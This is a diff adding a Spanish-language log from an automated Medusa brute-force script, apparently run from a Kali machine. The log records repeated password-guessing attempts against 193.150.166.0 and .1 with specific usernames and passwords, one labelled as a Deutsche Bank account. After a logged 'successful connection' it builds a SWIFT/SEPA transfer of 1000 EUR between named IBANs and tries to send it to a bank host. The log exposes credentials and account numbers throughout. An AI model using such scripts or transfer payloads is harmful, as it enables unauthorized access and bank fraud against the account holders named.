@@ -1,0 +1,111 @@
+2025-03-30 18:43:10,153 - INFO - Iniciando script de ataque de Medusa...
+2025-03-30 18:43:10,154 - INFO - Configuración cargada correctamente.
+2025-03-30 18:43:10,154 - INFO - Iniciando: Ataque Medusa a 193.150.166.0 con 493069k1
+2025-03-30 18:46:08,066 - ERROR - El comando 'Ataque Medusa a 193.150.166.0 con 493069k1' excedió el tiempo de espera y fue terminado.
+2025-03-30 18:46:08,069 - INFO - Iniciando ataque de Medusa en 193.150.166.0 con usuario 493069k1 y contraseña bar1588623...
+2025-03-30 18:46:08,069 - INFO - Iniciando: Ataque Medusa a 193.150.166.0 con 493069k1
+2025-03-30 18:49:05,204 - ERROR - El comando 'Ataque Medusa a 193.150.166.0 con 493069k1' excedió el tiempo de espera y fue terminado.
+2025-03-30 18:49:05,204 - INFO - Iniciando ataque de Medusa en 193.150.166.0 con usuario 493069k1 y contraseña 54082...
+2025-03-30 18:49:05,205 - INFO - Iniciando: Ataque Medusa a 193.150.166.0 con 493069k1
+2025-03-30 18:49:23,536 - INFO - Iniciando script de ataque de Medusa...
+2025-03-30 18:49:23,537 - INFO - Configuración cargada correctamente.
+2025-03-30 18:49:23,537 - INFO - Iniciando: Ataque Medusa a 193.150.166.0 con 493069k1
+2025-03-30 18:50:24,224 - INFO - Iniciando script de ataque de Medusa...
+2025-03-30 18:50:24,224 - INFO - Configuración cargada correctamente.
+2025-03-30 18:50:24,224 - INFO - Iniciando: Ataque Medusa a 193.150.166.0 con 493069K1
+2025-03-30 18:52:21,240 - INFO - Iniciando script de ataque de Medusa...
+2025-03-30 18:52:21,241 - INFO - Configuración cargada correctamente.
+2025-03-30 18:52:21,242 - INFO - Iniciando: Ataque Medusa a 193.150.166.1 con 493069K1
+2025-03-30 18:53:52,062 - INFO - Iniciando script de ataque de Medusa...
+2025-03-30 18:53:52,062 - INFO - Configuración cargada correctamente.
+2025-03-30 18:53:52,063 - INFO - Iniciando: Ataque Medusa a 193.150.166.1 con 493069k1
+2025-03-30 18:54:13,422 - INFO - Iniciando script de ataque de Medusa...
+2025-03-30 18:54:13,422 - INFO - Configuración cargada correctamente.
+2025-03-30 18:54:13,423 - INFO - Iniciando: Ataque Medusa a 193.150.166.1 con 493069K1
+2025-03-30 18:57:11,092 - ERROR - El comando 'Ataque Medusa a 193.150.166.1 con 493069K1' excedió el tiempo de espera y fue terminado.
+2025-03-30 18:57:11,093 - INFO - Iniciando ataque de Medusa en 193.150.166.1 con usuario 493069K1 y contraseña bar1588623...
+2025-03-30 18:57:11,093 - INFO - Iniciando: Ataque Medusa a 193.150.166.1 con 493069K1
+2025-03-30 19:00:08,256 - ERROR - El comando 'Ataque Medusa a 193.150.166.1 con 493069K1' excedió el tiempo de espera y fue terminado.
+2025-03-30 19:00:08,261 - INFO - Iniciando ataque de Medusa en 193.150.166.1 con usuario 493069K1 y contraseña 54082...
+2025-03-30 19:00:08,262 - INFO - Iniciando: Ataque Medusa a 193.150.166.1 con 493069K1
+2025-03-30 19:34:02,466 - INFO - Iniciando script de ataque de Medusa...
+2025-03-30 19:34:02,467 - INFO - Configuración cargada correctamente.
+2025-03-30 19:34:02,467 - INFO - Iniciando: Ataque Medusa a 193.150.166.1 con deutschebank@AS8373
+2025-03-30 21:08:00,553 - INFO - Iniciando script de ataque de Medusa...
+2025-03-30 21:08:00,555 - INFO - Configuración cargada correctamente.
+2025-03-30 21:08:00,557 - INFO - Iniciando: Ataque Medusa a 193.150.166.1 con deutschebank@AS8373
+2025-03-30 21:09:24,956 - INFO - Iniciando script de ataque de Medusa...
+2025-03-30 21:09:24,957 - INFO - Configuración cargada correctamente.
+2025-03-30 21:09:24,957 - INFO - Iniciando: Ataque Medusa a 193.150.166.1 con deutschebank@AS8373
+2025-03-30 21:12:22,262 - ERROR - El comando 'Ataque Medusa a 193.150.166.1 con deutschebank@AS8373' excedió el tiempo de espera y fue terminado.
+2025-03-30 21:12:22,268 - INFO - Iniciando ataque de Medusa en 193.150.166.1 con usuario deutschebank@AS8373 y contraseña 02569S...
+2025-03-30 21:12:22,269 - INFO - Enviando transacción JSON:
+2025-03-30 21:12:22,269 - INFO - {
+    "debtorAccount": {
+        "currencyCode": "EUR",
+        "iban": "DE86500700100925993805"
+    },
+    "instructedAmount": {
+        "amount": 1000.0,
+        "currencyCode": "EUR"
+    },
+    "creditorName": "ZAIBATSUS.L.",
+    "creditorAccount": {
+        "currencyCode": "EUR",
+        "iban": "ES3901821250410201520178"
+    },
+    "creditorBank": "BANCO BILBAO VIZCAYA ARGENTARIA, S.A.",
+    "creditorAgent": {
+        "financialInstitutionId": "BBVAESMMXXX"
+    },
+    "creditorAddress": {
+        "buildingNumber": "20",
+        "city": "BILBAO",
+        "country": "ES",
+        "postalCode": "48009",
+        "street": "CALLE IPARRAGUIRRE"
+    },
+    "debtorName": "MIRYA TRADING CO LTD",
+    "debtorBank": "DEUTSCHE BANK",
+    "debtorAgent": "DEUTDEFFXXX",
+    "debtorAddress": {
+        "buildingNumber": "1",
+        "city": "FRANKFURT",
+        "country": "DE",
+        "postalCode": "60325",
+        "street": "TAUNUSANLAGE"
+    },
+    "remittanceInformationUnstructured": "JN2DKYS-LNS-K",
+    "date": "2025-03-30",
+    "paymentType": "SCT",
+    "endToEndIdentification": "99c3a3d6-d47d-47df-8eca-986f6076dee2",
+    "fecha": "2025-03-30 21:12:22",
+    "ip_servidor": "193.150.166.1",
+    "usuario": "deutschebank@AS8373",
+    "clave": "02569S",
+    "estado": "conexion_exitosa"
+}
+2025-03-30 21:12:22,503 - ERROR - Error al enviar la transferencia SWIFT: HTTPSConnectionPool(host='ebankingdb.db.com', port=443): Max retries exceeded with url: / (Caused by NameResolutionError("<urllib3.connection.HTTPSConnection object at 0x7f5a0dcd02f0>: Failed to resolve 'ebankingdb.db.com' ([Errno -2] Name or service not known)"))
+2025-03-30 21:12:22,504 - INFO - Reintentando en 5 segundos...
+2025-03-30 21:12:27,757 - ERROR - Error al enviar la transferencia SWIFT: HTTPSConnectionPool(host='ebankingdb.db.com', port=443): Max retries exceeded with url: / (Caused by NameResolutionError("<urllib3.connection.HTTPSConnection object at 0x7f5a0dcc56d0>: Failed to resolve 'ebankingdb.db.com' ([Errno -2] Name or service not known)"))
+2025-03-30 21:12:27,757 - INFO - Reintentando en 5 segundos...
+2025-03-30 21:12:32,980 - ERROR - Error al enviar la transferencia SWIFT: HTTPSConnectionPool(host='ebankingdb.db.com', port=443): Max retries exceeded with url: / (Caused by NameResolutionError("<urllib3.connection.HTTPSConnection object at 0x7f5a0dcc60d0>: Failed to resolve 'ebankingdb.db.com' ([Errno -2] Name or service not known)"))
+2025-03-30 21:12:32,982 - ERROR - Máximo número de reintentos alcanzado. No se pudo enviar la transferencia SWIFT.
+2025-03-30 21:12:32,982 - INFO - Iniciando: Ataque Medusa a 193.150.166.1 con deutschebank@AS8373
+2025-03-30 21:17:47,314 - INFO - Iniciando script de ataque de Medusa...
+2025-03-30 21:17:47,314 - INFO - Configuración cargada correctamente.
+2025-03-30 21:17:47,314 - INFO - Iniciando: Ataque Medusa a 193.150.166.1 con deutschebank@AS8373
+2025-03-30 21:18:15,770 - INFO - Iniciando script de ataque de Medusa...
+2025-03-30 21:18:15,771 - INFO - Configuración cargada correctamente.
+2025-03-30 21:18:15,771 - INFO - Iniciando: Ataque Medusa a 193.150.166.1 con deutschebank@AS8373
+2025-04-07 12:38:48,435 - INFO - Iniciando script de ataque de Medusa...
+2025-04-07 12:38:48,435 - INFO - Configuración cargada correctamente.
+2025-04-07 12:38:48,435 - ERROR - Error al leer el archivo /home/kali/Documentos/GitHub/config/scripts/automate/diccionarios/diccionarios/diccionarios/users: [Errno 2] No such file or directory: '/home/kali/Documentos/GitHub/config/scripts/automate/diccionarios/diccionarios/diccionarios/users'
+2025-04-07 12:38:48,435 - ERROR - Error al leer el archivo /home/kali/Documentos/GitHub/config/scripts/automate/diccionarios/diccionarios/diccionarios/passwords: [Errno 2] No such file or directory: '/home/kali/Documentos/GitHub/config/scripts/automate/diccionarios/diccionarios/diccionarios/passwords'
+2025-04-07 12:38:48,435 - INFO - Script de ataque de Medusa completado.
+2025-04-07 12:39:10,078 - INFO - Iniciando script de ataque de Medusa...
+2025-04-07 12:39:10,078 - INFO - Configuración cargada correctamente.
+2025-04-07 12:39:10,078 - INFO - Iniciando: Ataque Medusa a 193.150.166.1 con 493069k1
+2025-04-07 12:46:40,776 - INFO - Iniciando script de ataque de Medusa...
+2025-04-07 12:46:40,776 - INFO - Configuración cargada correctamente.
+2025-04-07 12:46:40,777 - INFO - Iniciando: Ataque Medusa a 193.150.166.1 con 493069k1
